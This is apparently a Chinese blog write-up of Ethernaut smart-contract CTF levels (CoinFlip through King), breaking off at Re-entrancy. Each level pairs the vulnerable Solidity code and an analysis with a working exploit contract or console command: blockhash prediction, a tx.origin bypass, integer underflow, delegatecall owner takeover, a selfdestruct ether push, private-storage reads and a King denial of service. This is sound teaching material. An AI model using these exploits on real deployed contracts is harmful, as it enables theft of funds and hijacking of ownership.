<h5 id="合约分析-2"><a href="#合约分析-2" class="headerlink" title="合约分析"></a>合约分析</h5><p>在合约的开头先定义了三个uint256类型的数据——consecutiveWins、lastHash、FACTOR，其中FACTOR被赋予了一个很大的数值，之后查看了一下发现是2^255。<br>之后定义的CoinFlip为构造函数，在构造函数中将我们的猜对次数初始化为0。<br>之后的flip函数先定义了一个blockValue，值是前一个区块的hash值转换为uint256类型，block.number为当前的区块数，之后检查lasthash是否等于blockValue，相等则revert，回滚到调用前状态。之后便给lasthash赋值为blockValue，所以lasthash代表的就是上一个区块的hash值。<br>之后就是产生coinflip，它就是拿来判断硬币翻转的结果的，它是拿blockValue&#x2F;FACTR，前面也提到FACTOR实际是等于2^255，若换成256的二进制就是最左位是0，右边全是1，而我们的blockValue则是256位的，因为solidity里“&#x2F;”运算会取整，所以coinflip的值其实就取决于blockValue最高位的值是1还是0，换句话说就是跟它的最高位相等，下面的代码就是简单的判断了。<br>通过对以上代码的分析我们可以看到硬币翻转的结果其实完全取决于前一个块的hash值，看起来这似乎是随机的，它也确实是随机的，然而事实上它也是可预测的，因为一个区块当然并不只有一个交易，所以我们完全可以先运行一次这个算法，看当前块下得到的coinflip是1还是0然后选择对应的guess，这样就相当于提前看了结果。因为块之间的间隔也只有10s左右，要手工在命令行下完成合约分析中操作还是有点困难，所以我们需要在链上另外部署一个合约来完成这个操作，在部署时可以直接使用<a target="_blank" rel="noopener" href="http://remix.ethereum.org来部署/">http://remix.ethereum.org来部署</a><br>Exploit：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.18;</span><br><span class="line">contract CoinFlip &#123;</span><br><span class="line">  uint256 public consecutiveWins;</span><br><span class="line">  uint256 lastHash;</span><br><span class="line">  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;</span><br><span class="line"></span><br><span class="line">  function CoinFlip() public &#123;</span><br><span class="line">    consecutiveWins = 0;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function flip(bool _guess) public returns (bool) &#123;</span><br><span class="line">    uint256 blockValue = uint256(block.blockhash(block.number-1));</span><br><span class="line"></span><br><span class="line">    if (lastHash == blockValue) &#123;</span><br><span class="line">      revert();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    lastHash = blockValue;</span><br><span class="line">    uint256 coinFlip = blockValue/FACTOR;</span><br><span class="line">    bool side = coinFlip == 1 ? true : false;</span><br><span class="line"></span><br><span class="line">    if (side == _guess) &#123;</span><br><span class="line">      consecutiveWins++;</span><br><span class="line">      return true;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      consecutiveWins = 0;</span><br><span class="line">      return false;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract exploit &#123;</span><br><span class="line">  CoinFlip expFlip;</span><br><span class="line">  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;</span><br><span class="line"></span><br><span class="line">  function exploit(address aimAddr) &#123;</span><br><span class="line">    expFlip = CoinFlip(aimAddr);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function hack() public &#123;</span><br><span class="line">    uint256 blockValue = uint256(block.blockhash(block.number-1));</span><br><span class="line">    uint256 coinFlip = uint256(uint256(blockValue) / FACTOR);</span><br><span class="line">    bool guess = coinFlip == 1 ? true : false;</span><br><span class="line">    expFlip.flip(guess);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="攻击流程-2"><a href="#攻击流程-2" class="headerlink" title="攻击流程"></a>攻击流程</h5><p>点击“Get new Instance”获取一个实例：</p>
<p>之后获取合约的地址以及”consecutiveWins”的值：</p>
<p>之后在remix中编译合约</p>
<p>之后在remix中部署“exploit”合约，这里需要使用上面获取到的合约地址：</p>
<p>之后合约成功部署：</p>
<p>之后点击”hack”实施攻击（至少需要调用10次）：</p>
<p>之后再次查看“consecutiveWins”的值，直到大于10时提交即可：</p>
<p>之后点击“submit instance”提交示例：</p>
<p>之后成功闯关：</p>
<h3 id="Telephone"><a href="#Telephone" class="headerlink" title="Telephone"></a>Telephone</h3><h5 id="闯关要求-3"><a href="#闯关要求-3" class="headerlink" title="闯关要求"></a>闯关要求</h5><ul>
<li>获取合约的owner权限</li>
</ul>
<h5 id="合约代码-3"><a href="#合约代码-3" class="headerlink" title="合约代码"></a>合约代码</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.18;</span><br><span class="line"></span><br><span class="line">contract Telephone &#123;</span><br><span class="line"></span><br><span class="line">  address public owner;</span><br><span class="line"></span><br><span class="line">  function Telephone() public &#123;</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function changeOwner(address _owner) public &#123;</span><br><span class="line">    if (tx.origin != msg.sender) &#123;</span><br><span class="line">      owner = _owner;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="合约分析-3"><a href="#合约分析-3" class="headerlink" title="合约分析"></a>合约分析</h5><p>前面是个构造函数，把owner赋给了合约的创建者，照例看了一下这是不是真的构造函数，确定没有问题，下面一个changeOwner函数则检查tx.origin和msg.sender是否相等，如果不一样就把owner更新为传入的owner。<br>这里涉及到了tx.origin和msg.sender的区别，前者表示交易的发送者，后者则表示消息的发送者，如果情景是在一个合约下的调用，那么这两者是木有区别的，但是如果是在多个合约的情况下，比如用户通过A合约来调用B合约，那么对于B合约来说，msg.sender就代表合约A，而tx.origin就代表用户，知道了这些那么就很简单了，和上一个题目一样，我们这里需要另外部署一个合约来调用这儿的changeOwner：<br>Exploit:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.18;</span><br><span class="line"></span><br><span class="line">contract Telephone &#123;</span><br><span class="line"></span><br><span class="line">  address public owner;</span><br><span class="line"></span><br><span class="line">  function Telephone() public &#123;</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function changeOwner(address _owner) public &#123;</span><br><span class="line">    if (tx.origin != msg.sender) &#123;</span><br><span class="line">      owner = _owner;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">contract exploit &#123;</span><br><span class="line"></span><br><span class="line">    Telephone target = Telephone(your instance address);</span><br><span class="line"></span><br><span class="line">    function hack()&#123;</span><br><span class="line">        target.changeOwner(msg.sender);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="攻击流程-3"><a href="#攻击流程-3" class="headerlink" title="攻击流程"></a>攻击流程</h5><p>点击“Get new Instance”来获取一个实例：<br>之后查看合约的地址：<br>之后用上面的地址替换exploit中的地址,最终的exp如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.18;</span><br><span class="line"></span><br><span class="line">contract Telephone &#123;</span><br><span class="line"></span><br><span class="line">  address public owner;</span><br><span class="line"></span><br><span class="line">  function Telephone() public &#123;</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function changeOwner(address _owner) public &#123;</span><br><span class="line">    if (tx.origin != msg.sender) &#123;</span><br><span class="line">      owner = _owner;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">contract exploit &#123;</span><br><span class="line"></span><br><span class="line">    Telephone target = Telephone(0x932b6c14f6dd1a055206b0784f7b38d2217d30e5);</span><br><span class="line"></span><br><span class="line">    function hack()&#123;</span><br><span class="line">        target.changeOwner(msg.sender);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>之后在remix中编译合约：<br>部署合约<br>之后查看原合约的owner地址：<br>之后点击“hack”来实施攻击：<br>之后成功变换合约的owner<br>之后点击“submit instance”来提交示例即可：</p>
<h3 id="Token"><a href="#Token" class="headerlink" title="Token"></a>Token</h3><h5 id="闯关要求-4"><a href="#闯关要求-4" class="headerlink" title="闯关要求"></a>闯关要求</h5><p>玩家初始有token20个，想办法黑掉这个智能合约来获取得更多Token！</p>
<h5 id="合约代码-4"><a href="#合约代码-4" class="headerlink" title="合约代码"></a>合约代码</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.18;</span><br><span class="line"></span><br><span class="line">contract Token &#123;</span><br><span class="line"></span><br><span class="line">  mapping(address =&gt; uint) balances;</span><br><span class="line">  uint public totalSupply;</span><br><span class="line"></span><br><span class="line">  function Token(uint _initialSupply) public &#123;</span><br><span class="line">    balances[msg.sender] = totalSupply = _initialSupply;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function transfer(address _to, uint _value) public returns (bool) &#123;</span><br><span class="line">    require(balances[msg.sender] - _value &gt;= 0);</span><br><span class="line">    balances[msg.sender] -= _value;</span><br><span class="line">    balances[_to] += _value;</span><br><span class="line">    return true;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function balanceOf(address _owner) public view returns (uint balance) &#123;</span><br><span class="line">    return balances[_owner];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="合约分析-4"><a href="#合约分析-4" class="headerlink" title="合约分析"></a>合约分析</h5><p>此处的映射balance代表了我们拥有的token，然后通关构造函数初始化了owner的balance，虽然不知道是多少，下面的transfer函数的功能为转账操作，最下面的balanceOf函数功能为查询当前账户余额。<br>通过粗略的一遍功能查看之后我们重点来看此处的transfer()函数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function transfer(address _to, uint _value) public returns (bool) &#123;</span><br><span class="line">    require(balances[msg.sender] - _value &gt;= 0);</span><br><span class="line">    balances[msg.sender] -= _value;</span><br><span class="line">    balances[_to] += _value;</span><br><span class="line">    return true;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>在该函数中最为关键第一处就是”require”校验，此处可以通过“整数下溢”来绕过检查，同时这里的balances和value都是无符号整数，所以无论如何他们相减之后值依旧大于0（在相等的条件下为0）。<br>那么在当前题目条件下(题目中token初始化为20)，所以当转21的时候则会发生下溢，导致数值变大其数值为2^256 - 1</p>
<h5 id="攻击流程-4"><a href="#攻击流程-4" class="headerlink" title="攻击流程"></a>攻击流程</h5><p>点击“Get new instance”来获取一个实例<br>之后调用transfer函数向玩家地址转币：</p>
<p>之后等交易完成之后，我们可以看到玩家的代币数量会变得非常非得多，和我们之前预期的一样：</p>
<p>之后我们点击“submit instance”提交答案即可：</p>
<h3 id="Delegation"><a href="#Delegation" class="headerlink" title="Delegation"></a>Delegation</h3><h5 id="闯关要求-5"><a href="#闯关要求-5" class="headerlink" title="闯关要求"></a>闯关要求</h5><p>获取合约的owner权限。</p>
<h5 id="合约代码-5"><a href="#合约代码-5" class="headerlink" title="合约代码"></a>合约代码</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.18;</span><br><span class="line"></span><br><span class="line">contract Delegate &#123;</span><br><span class="line"></span><br><span class="line">  address public owner;</span><br><span class="line"></span><br><span class="line">  function Delegate(address _owner) public &#123;</span><br><span class="line">    owner = _owner;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function pwn() public &#123;</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Delegation &#123;</span><br><span class="line"></span><br><span class="line">  address public owner;</span><br><span class="line">  Delegate delegate;</span><br><span class="line"></span><br><span class="line">  function Delegation(address _delegateAddress) public &#123;</span><br><span class="line">    delegate = Delegate(_delegateAddress);</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function() public &#123;</span><br><span class="line">    if(delegate.delegatecall(msg.data)) &#123;</span><br><span class="line">      this;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="合约分析-5"><a href="#合约分析-5" class="headerlink" title="合约分析"></a>合约分析</h5><p>在这里我们看到了两个合约，Delegate初始化时将传入的address设定为合约的owner，下面一个pwn函数也引起我们的注意，从名字也能看出挺关键的。<br>之后下面的Delegation合约则实例化了上面的Delegate合约，其fallback函数使用了delegatecall来调用其中的delegate合约，而这里的delegatecall就是问题的关键所在。<br>我们经常会使用call函数与合约进行交互，对合约发送数据，当然，call是一个较底层的接口，我们经常会把它封装在其他函数里使用，不过性质是差不多的，这里用到的delegatecall跟call主要的不同在于通过delegatecall调用的目标地址的代码要在当前合约的环境中执行，也就是说它的函数执行在被调用合约部分其实只用到了它的代码，所以这个函数主要是方便我们使用存在其他地方的函数，也是模块化代码的一种方法，然而这也很容易遭到破坏。用于调用其他合约的call类的函数，其中的区别如下：<br>1、call 的外部调用上下文是外部合约<br>2、delegatecall 的外部调用上下是调用合约上下文<br>3、callcode() 其实是 delegatecall() 之前的一个版本，两者都是将外部代码加载到当前上下文中进行执行，但是在 msg.sender 和 msg.value 的指向上却有差异。</p>
<p>在这里我们要做的就是使用delegatecall调用delegate合约的pwn函数，这里就涉及到使用call指定调用函数的操作，当你给call传入的第一个参数是四个字节时，那么合约就会默认这四个自己就是你要调用的函数，它会把这四个字节当作函数的id来寻找调用函数，而一个函数的id在以太坊的函数选择器的生成规则里就是其函数签名的sha3的前4个bytes，函数前面就是带有括号括起来的参数类型列表的函数名称。</p>
<p>经过上面的简要分析，问题就变很简单了，sha3我们可以直接通过web3.sha3来调用，而delegatecall在fallback函数里，我们得想办法来触发它，前面已经提到有两种方法来触发，但是这里我们需要让delegatecall使用我们发送的data，所以这里我们直接用封装好的sendTransaction来发送data，其实到了这里我也知道了前面fallback那关我们也可以使用这个方式来触发fallback函数：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">contract.<span class="title function_">sendTransaction</span>(&#123;<span class="attr">data</span>:web3.<span class="title function_">sha3</span>(<span class="string">&quot;pwn()&quot;</span>).<span class="title function_">slice</span>(<span class="number">0</span>,<span class="number">10</span>)&#125;);</span><br></pre></td></tr></table></figure>

<h5 id="攻击流程-5"><a href="#攻击流程-5" class="headerlink" title="攻击流程"></a>攻击流程</h5><p>点击“get new instance”来获取一个实例<br>之后通过fallback函数里的delegatecall来调用pwn函数更换owner：<br>之后点击“submit instance”来提交答案</p>
<h3 id="Force"><a href="#Force" class="headerlink" title="Force"></a>Force</h3><h5 id="闯关要求-6"><a href="#闯关要求-6" class="headerlink" title="闯关要求"></a>闯关要求</h5><p>让合约的balance比0多</p>
<h5 id="合约代码-6"><a href="#合约代码-6" class="headerlink" title="合约代码"></a>合约代码</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.18;</span><br><span class="line"></span><br><span class="line">contract Force &#123;/*</span><br><span class="line"></span><br><span class="line">                   MEOW ?</span><br><span class="line">         /\_/\   /</span><br><span class="line">    ____/ o o \</span><br><span class="line">  /~____  =ø= /</span><br><span class="line"> (______)__m_m)</span><br><span class="line"></span><br><span class="line">*/&#125;</span><br></pre></td></tr></table></figure>

<h5 id="合约分析-6"><a href="#合约分析-6" class="headerlink" title="合约分析"></a>合约分析</h5><p>第一眼看上去——懵了，这是什么呀？一个猫？？？，合约Force中竟然没有任何相关的合约代码，感觉莫名奇妙。。。<br>经过查看资料，发现在以太坊里我们是可以强制给一个合约发送eth的，不管它要不要它都得收下，这是通过selfdestruct函数来实现的，如它的名字所显示的，这是一个自毁函数，当你调用它的时候，它会使该合约无效化并删除该地址的字节码，然后它会把合约里剩余的资金发送给参数所指定的地址，比较特殊的是这笔资金的发送将无视合约的fallback函数，因为我们之前也提到了当合约直接收到一笔不知如何处理的eth时会触发fallback函数，然而selfdestruct的发送将无视这一点，这里确实是比较有趣了。<br>那么接下来就非常简单了，我们只需要创建一个合约并存点eth进去然后调用selfdestruct将合约里的eth发送给我们的目标合约就行了。</p>
<h5 id="攻击流程-6"><a href="#攻击流程-6" class="headerlink" title="攻击流程"></a>攻击流程</h5><p>点击“Get new Instance”来获取一个实例：</p>
<p><img src="/picture/ethernaut%E8%AE%AD%E7%BB%83%E7%AC%94%E8%AE%B0/image-20240320160351311.png" alt="image-20240320160351311">之后获取合约地址<br>之后创建一个合约并存点eth进去然后调用selfdestruct将合约里的eth发送给目标合约：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.20;</span><br><span class="line">contract Force &#123;</span><br><span class="line"> function Force() public payable &#123;&#125;</span><br><span class="line"> function exploit(address _target) public &#123;</span><br><span class="line">    selfdestruct(_target);</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编译合约<br>部署合约<br>之后调用“ForceSendEther()”函数，并传入合约的地址：<br>交易成功之后，再次查看合约的额度发现——“非零”<br>之后点击“submit instance”进行提及案例即可：</p>
<h3 id="Vault"><a href="#Vault" class="headerlink" title="Vault"></a>Vault</h3><h5 id="闯关要求-7"><a href="#闯关要求-7" class="headerlink" title="闯关要求"></a>闯关要求</h5><p>解锁用户。</p>
<h5 id="合约代码-7"><a href="#合约代码-7" class="headerlink" title="合约代码"></a>合约代码</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.18;</span><br><span class="line"></span><br><span class="line">contract Vault &#123;</span><br><span class="line">  bool public locked;</span><br><span class="line">  bytes32 private password;</span><br><span class="line"></span><br><span class="line">  function Vault(bytes32 _password) public &#123;</span><br><span class="line">    locked = true;</span><br><span class="line">    password = _password;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function unlock(bytes32 _password) public &#123;</span><br><span class="line">    if (password == _password) &#123;</span><br><span class="line">      locked = false;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="合约分析-7"><a href="#合约分析-7" class="headerlink" title="合约分析"></a>合约分析</h5><p>从代码里可以看到我们需要得到它的密码来调用unlock函数以解锁合约，而且我们注意到在开始它是直接定义存储了password的，虽然因为是private我们不能直接看到，然而我们要知道这是在以太坊上，这是一个区块链，它是透明的，数据都是存在块里面的，所以我们可以直接拿到它。</p>
<p>这里通过getStorageAt函数来访问它，getStorageAt函数可以让我们访问合约里状态变量的值，它的两个参数里第一个是合约的地址，第二个则是变量位置position，它是按照变量声明的顺序从0开始，顺次加1，不过对于mapping这样的复杂类型，position的值就没那么简单了。</p>
<h5 id="攻击流程-7"><a href="#攻击流程-7" class="headerlink" title="攻击流程"></a>攻击流程</h5><p>点击“Get new Instance”之后获取一个实例<br>之后在console下运行以下代码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">web3.eth.getStorageAt(contract.address, 1, function(x, y) &#123;alert(web3.toAscii(y))&#125;);</span><br><span class="line">之后进行解锁：</span><br><span class="line">之后点击“submit”来提交答案：</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>上篇分析至此结束，下篇目前已经写好，后续不久会奉上~</p>
<h3 id="King"><a href="#King" class="headerlink" title="King"></a>King</h3><h5 id="闯关要求-8"><a href="#闯关要求-8" class="headerlink" title="闯关要求"></a>闯关要求</h5><p>合同代表一个非常简单的游戏：谁给它发送了比当前奖金还大的数量的以太，就成为新的国王。在这样的事件中，被推翻的国王获得了新的奖金，但是如果你提交的话那么合约就会回退，让level重新成为国王，而我们的目标就是阻止这一情况的发生。</p>
<h5 id="合约代码-8"><a href="#合约代码-8" class="headerlink" title="合约代码"></a>合约代码</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.18;</span><br><span class="line"></span><br><span class="line">import &#x27;zeppelin-solidity/contracts/ownership/Ownable.sol&#x27;;</span><br><span class="line"></span><br><span class="line">contract King is Ownable &#123;</span><br><span class="line"></span><br><span class="line">  address public king;</span><br><span class="line">  uint public prize;</span><br><span class="line"></span><br><span class="line">  function King() public payable &#123;</span><br><span class="line">    king = msg.sender;</span><br><span class="line">    prize = msg.value;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function() external payable &#123;</span><br><span class="line">    require(msg.value &gt;= prize || msg.sender == owner);</span><br><span class="line">    king.transfer(msg.value);</span><br><span class="line">    king = msg.sender;</span><br><span class="line">    prize = msg.value;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="合约分析-8"><a href="#合约分析-8" class="headerlink" title="合约分析"></a>合约分析</h5><p>从上面的代码中可以看到当国王被推翻时国王将会获得奖金，那么只要国王拒绝接受奖金就可以一直是国王。<br>通过上面的代码分析，我们可以部署以下攻击合约,当原智能合约有新的king诞生时会向我们的合约退还之前的奖金，但是攻击合约不接收，直接revert()那么就可以永远占据合约的king不放：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.18;</span><br><span class="line"></span><br><span class="line">contract attack&#123;</span><br><span class="line">    function attack(address _addr) public payable&#123;</span><br><span class="line">        _addr.call.gas(10000000).value(msg.value)();</span><br><span class="line">    &#125;</span><br><span class="line">    function () public &#123;</span><br><span class="line">        revert();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="攻击流程-8"><a href="#攻击流程-8" class="headerlink" title="攻击流程"></a>攻击流程</h5><p>点击“Get new Instance”来获取一个实例：<br>之后先来查看一下prize值以及合约的king、合约的地址<br>之后我们在remix中编译并部署攻击合约：<br>合约部署地址：<br>之后再次查看king，发现已经变成了我们攻击合约的地址：<br>之后我们点击“submit instance”来提交该实例：<br>之后成功过关，当我们查看king时发现依旧是我们的攻击合约的地址：</p>
<h3 id="Re-entrancy"><a href="#Re-entrancy" class="headerlink" title="Re-entrancy"></a>Re-entrancy</h3><h5 id="闯关要求-9"><a href="#闯关要求-9" class="headerlink" title="闯关要求"></a>闯关要求</h5><p>盗取合约中的所有代币。</p>
<h5 id="合约代码-9"><a href="#合约代码-9" class="headerlink" title="合约代码"></a>合约代码</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.12;</span><br><span class="line"></span><br><span class="line">import &#x27;openzeppelin-contracts-06/math/SafeMath.sol&#x27;;</span><br><span class="line"></span><br><span class="line">contract Reentrance &#123;</span><br><span class="line">  </span><br><span class="line">  using SafeMath for uint256;</span><br><span class="line">  mapping(address =&gt; uint) public balances;</span><br><span class="line"></span><br><span class="line">  function donate(address _to) public payable &#123;</span><br><span class="line">    balances[_to] = balances[_to].add(msg.value);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function balanceOf(address _who) public view returns (uint balance) &#123;</span><br><span class="line">    return balances[_who];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function withdraw(uint _amount) public &#123;</span><br><span class="line">    if(balances[msg.sender] &gt;= _amount) &#123;</span><br><span class="line">      (bool result,) = msg.sender.call&#123;value:_amount&#125;(&quot;&quot;);</span><br><span class="line">      if(result) &#123;</span><br><span class="line">        _amount;</span><br><span class="line">      